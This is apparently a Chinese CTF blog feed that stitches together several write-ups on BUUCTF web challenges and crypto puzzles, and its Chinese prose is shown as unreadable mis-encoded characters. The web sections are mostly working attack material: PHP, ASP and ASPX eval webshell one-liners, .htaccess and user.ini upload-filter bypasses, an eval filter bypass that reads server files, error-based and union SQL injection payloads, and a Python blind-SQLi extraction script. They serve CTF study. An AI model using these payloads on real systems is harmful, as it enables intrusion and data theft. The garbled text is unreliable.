<p>å¸¸è§çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpçš„ä¸€å¥è¯æœ¨é©¬ï¼š &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">aspçš„ä¸€å¥è¯æ˜¯ï¼š   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspxçš„ä¸€å¥è¯æ˜¯ï¼š  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<p><strong>ASP æ–‡ä»¶å¯åŒ…å«æ–‡æœ¬ã€ HTML æ ‡ç­¾å’Œè„šæœ¬ã€‚ASP æ–‡ä»¶ä¸­çš„è„šæœ¬å¯åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚</strong></p>
<p>htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚æ–°å»º.htaccessæ–‡ä»¶ï¼Œç¼–è¾‘å†…å®¹ä¸ºSetHandler application&#x2F;x-httpd-php</p>
<p>&#x2F;&#x2F;è¯¥è¯­å¥ä½œç”¨æ˜¯è®©Apacheå°†å…¶ä»–ç±»å‹æ–‡ä»¶å‡ä»¥phpæ ¼å¼è§£æ</p>
<h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><h3 id="Pythonçš„webæ¡†æ¶-Tornado"><a href="#Pythonçš„webæ¡†æ¶-Tornado" class="headerlink" title="Pythonçš„webæ¡†æ¶-Tornado"></a>Pythonçš„webæ¡†æ¶-Tornado</h3><p><a href="https://so.csdn.net/so/search?q=tornado&spm=1001.2101.3001.7020">tornado</a>.web.Applicationå¯¹è±¡åˆå§‹åŒ–èµ‹äºˆcookie_secretå‚æ•°ï¼Œç”¨äºä¿å­˜æœ¬ç½‘ç«™cookiesåŠ å¯†å¯†é’¥</p>
<p>&#x2F;hints.txt<br>md5(cookie_secret+md5(filename))</p>
<p>&#x2F;flag.txt<br>flag in &#x2F;fllllllllllllag</p>
<p>&#x2F;welcome.txt<br>render</p>
<p>cookie_secretçš„å€¼</p>
<p>error?msg&#x3D;</p>
<p>å³å¯æŸ¥çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;f6fcc9c5-389d-4b35-95c9-ceb850ba40a5&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>filename&#x3D;&#x2F;fllllllllllllag   åŠ å¯†å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3bf9f6cf685a6dd8defadabfb41a03a1  </span><br></pre></td></tr></table></figure>

<p>æ‹¼æ¥md5åŠ å¯†å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6ee95f59fff4fc3fa9cb75bf353e4864</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file?filename=/fllllllllllllag&amp;filehash=6ee95f59fff4fc3fa9cb75bf353e4864</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">time</span>() . (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$t_path</span> = <span class="variable">$target_path</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploaded_ext</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æˆ‘æ‰Œyour problem?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)|| (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>)) &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>))&#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploaded_tmp</span>);</span><br><span class="line">			<span class="title function_ invoke__">mkdir</span>(<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, <span class="variable">$target_path</span>), <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">			<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_tmp</span>, <span class="variable">$t_path</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æˆ‘æ‰Œyour problem?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶ä¿®æ”¹ç±»å‹ä¸ºpng</p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p>æ¥ç€ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">  &lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥</p>
<p>flag{449ef412-2b10-4498-b258-8e2fcdfd2938}</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chr() â€” è¿”å›æŒ‡å®šçš„å­—ç¬¦</span><br><span class="line">scandir() â€” åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•</span><br><span class="line">var_dump() â€” æ‰“å°å˜é‡çš„ç›¸å…³ä¿¡æ¯</span><br><span class="line">file_get_contents() â€” å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="line">foreach è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼ã€‚</span><br><span class="line">foreach (array_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (array_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">/i (å¿½ç•¥å¤§å°å†™)</span><br><span class="line">/g (å…¨æ–‡æŸ¥æ‰¾å‡ºç°çš„æ‰€æœ‰åŒ¹é…å­—ç¬¦)</span><br><span class="line">/m (å¤šè¡ŒæŸ¥æ‰¾)</span><br><span class="line">/gi(å…¨æ–‡æŸ¥æ‰¾ã€å¿½ç•¥å¤§å°å†™)</span><br><span class="line">/ig(å…¨æ–‡æŸ¥æ‰¾ã€å¿½ç•¥å¤§å°å†™)</span><br></pre></td></tr></table></figure>

<p>payload: äº§çœ‹ç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) ç­‰ä»· var_dump(file_get_contents(&quot;/flagg&quot;))</span><br><span class="line">/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL-æŠ¥é”™æ³¨å…¥"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL-æŠ¥é”™æ³¨å…¥" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL -æŠ¥é”™æ³¨å…¥"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL -æŠ¥é”™æ³¨å…¥</h2><p>é¢ï¼Œå°±ä¸€ä¸ªæ™®é€šçš„æŠ¥é”™æ³¨å…¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†andã€&#x3D; ç©ºæ ¼ unionç­‰å¤šä¸ªsqlå…³é”®å­—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#  //åªæŸ¥åˆ°äº†å·¦è¾¹ï¼Œæˆ‘ä»¬ç”¨rightå‡½æ•°</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>flag{986ccfdc-fbb9-4fba-bb4b-790ddb4a0d63}</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>user.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=&quot;1.jpg&quot;</span><br></pre></td></tr></table></figure>

<p>1.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89A?</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[1])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-BabySQli-è”åˆæ³¨å…¥"><a href="#GXYCTF2019-BabySQli-è”åˆæ³¨å…¥" class="headerlink" title="[GXYCTF2019]BabySQli-è”åˆæ³¨å…¥"></a>[GXYCTF2019]BabySQli-è”åˆæ³¨å…¥</h2><p>éšä¾¿è¾“å…¥æŸ¥çœ‹æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>

<p>è§£å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ç»™çš„æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line">// å»é™¤è½¬ä¹‰</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">    function stripslashes_deep($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $value = is_array($value) ?</span><br><span class="line">        array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">        stripslashes($value);</span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br><span class="line">    $_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">    $_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">    $_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">    $_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">    die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if (!$result) &#123;</span><br><span class="line">        printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $arr = mysqli_fetch_row($result);</span><br><span class="line">        if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">            if(md5($password) == $arr[2])&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;wrong pass!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;wrong user!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=admin&#x27; Order by 4#</span><br><span class="line">pw=1</span><br><span class="line">å›æ˜¾ï¼šError: Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;.</span><br><span class="line"></span><br><span class="line">name=admin&#x27; Order by 3#</span><br><span class="line">pw=1</span><br><span class="line">å›æ˜¾ï¼šwrong pass</span><br></pre></td></tr></table></figure>

<p>å­—æ®µä¸º3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#</span><br><span class="line">passwd=1</span><br></pre></td></tr></table></figure>

<p>c4ca4238a0b923820dcc509a6f75849bä¸ºmd5 åŠ å¯†åçš„1</p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>All You Want Is In Table â€˜flagâ€™ and the column is â€˜flagâ€™</p>
<p>Now, just give the id of passage</p>
<p>è¿™é“é¢˜å¯¹çˆ†ç ´æœ‰é™åˆ¶</p>
<p>é‡‡ç”¨å»¶æ—¶çˆ†ç ´ï¼Œbpå»¶æ—¶fuzzä¸€ä¸‹</p>
<p>æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#whited by zhou</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &quot;http://80d573a7-5e74-4238-b99e-da083c3a0314.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    i = i + 1</span><br><span class="line">    while head&lt;tail:</span><br><span class="line">        mid = (head + tail) // 2</span><br><span class="line">        payload = f&quot;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload,</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        if &quot;Hello&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line">    result += chr(head)</span><br><span class="line">    if &#x27;&#125;&#x27; in result:</span><br><span class="line">      break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>xx9nGK&amp;2t</p>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu2</title>
    <url>/2023/05/13/buu2/</url>
    <content><![CDATA[<p>buuç¬¬äºŒé¡µ</p>
 <span id="more"></span>

<h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>è®¿é—®robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>crypto</title>
    <url>/2023/01/08/crypto/</url>
    <content><![CDATA[<p>â€‹     tpye7åŠ å¯†</p>
<p>â€‹    uuencode</p>
<p>â€‹       <span id="more"></span></p>
<h1 id="tpye7è§£å¯†"><a href="#tpye7è§£å¯†" class="headerlink" title="tpye7è§£å¯†"></a>tpye7è§£å¯†</h1><p>ctfshow èœç‹—æ¯ ç±»å‹-7<br>094F5A0F0A0D1805103B0B3D143117183B720438350A45550967674D1E064F2969784440455A460F1A1B<br>tpye7 åŠ å¯†ç»“æœä¸º16è¿›åˆ¶<br><a href="https://www.bejson.com/encrypt/type7_decode/">tpye7è§£å¯†</a><br>ctfshow{Wow_u_Kn0w_Ci$c0_Type7_P@ssword!}</p>
<h1 id="Uuencode"><a href="#Uuencode" class="headerlink" title="Uuencode"></a>Uuencode</h1><p>buu crypto Unencode<br>å¯†æ–‡ï¼š<br>89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]<br><a href="https://www.qqxiuzi.cn/bianma/uuencode.php">uuencodeè§£å¯†ç½‘ç«™</a><br>flag{dsdasdsa99877LLLKK}</p>
<h1 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h1><p>buu Windowsç³»ç»Ÿå¯†ç </p>
<p>a7fcb22a88038f35a8f39d503e7f0062</p>
<p><a href="https://www.cmd5.com/">md5åœ¨çº¿è§£å¯†ç ´è§£,md5è§£å¯†åŠ å¯† (cmd5.com)</a></p>
<p>è§£å¯† good-luck</p>
<h1 id="ä¸­æ–‡ç”µç "><a href="#ä¸­æ–‡ç”µç " class="headerlink" title="ä¸­æ–‡ç”µç "></a>ä¸­æ–‡ç”µç </h1><p>buu ä¿¡æ¯åŒ–æ—¶ä»£çš„æ­¥ä¼</p>
<p>606046152623600817831216121621196386</p>
<p><a href="http://code.mcdvisa.com/">ä¸­æ–‡ç”µç æŸ¥è¯¢ Chinese Commercial Code - æ ‡å‡†ç”µæŠ¥ç å…è´¹åœ¨çº¿æŸ¥è¯¢|å§“åç”µç |ç¾å›½ç­¾è¯ç”µç  (mcdvisa.com)</a></p>
<p>è§£å¯†ï¼šè®¡ç®—æœºè¦ä»å¨ƒå¨ƒæŠ“èµ·</p>
<h1 id="å˜å¼‚å‡¯æ’’"><a href="#å˜å¼‚å‡¯æ’’" class="headerlink" title="å˜å¼‚å‡¯æ’’"></a>å˜å¼‚å‡¯æ’’</h1><p>MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}</p>
<p><a href="https://quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p>
<p>è§£ç ï¼šflag substitution cipher decryption is always easy just like a piece of cake</p>
<p>å»ç©ºæ ¼</p>
<h1 id="playfairè§£å¯†"><a href="#playfairè§£å¯†" class="headerlink" title="playfairè§£å¯†"></a>playfairè§£å¯†</h1><p>è¿˜èƒ½æç¤ºä»€ä¹ˆå‘¢ï¼Ÿå…¬å¹³çš„ç©å§ï¼ˆå¯†é’¥è‡ªå·±æ‰¾ï¼‰ Dncnoqqfliqrpgeklwmppu æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤, flag{å°å†™å­—æ¯}</p>
<p>æç¤ºå…¬å¹³çš„ç©ï¼Œplayfair</p>
<p><a href="https://rumkin.com/tools/cipher/playfair/">Playfair (rumkin.com)</a></p>
<p>å¯†é’¥playfair</p>
<p>flag{itisnotaproblemhavefun}</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
  </entry>
  <entry>
    <title>ctfshow-miscå…¥é—¨</title>
    <url>/2023/01/20/ctfshow-misc%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>zstegå®‰è£…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gem install zsteg</span><br></pre></td></tr></table></figure>



<span id="more"></span>

